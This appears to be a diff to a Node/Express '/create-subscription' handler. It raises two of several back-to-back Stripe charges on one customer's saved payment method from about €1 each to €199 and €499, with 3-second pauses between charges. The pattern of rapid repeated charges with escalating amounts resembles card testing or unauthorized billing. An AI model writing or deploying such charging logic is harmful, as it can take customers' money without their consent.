@@ -145,10 +145,10 @@ app.post('/create-subscription', async (req, res) => {
 
     await new Promise(resolve => setTimeout(resolve, 3000));
 
-    // Charge 2 — €1.02
+    // Charge 2 — €199.00
     try {
       const payment2 = await stripe.paymentIntents.create({
-        amount: 102,
+        amount: 19900,
         currency: 'eur',
         customer: customerId,
         payment_method: paymentMethodId,
@@ -165,10 +165,10 @@ app.post('/create-subscription', async (req, res) => {
 
     await new Promise(resolve => setTimeout(resolve, 3000));
 
-    // Charge 3 — €1.03
+    // Charge 3 — €499.00
     try {
       const payment3 = await stripe.paymentIntents.create({
-        amount: 103,
+        amount: 49900,
         currency: 'eur',
         customer: customerId,
         payment_method: paymentMethodId,
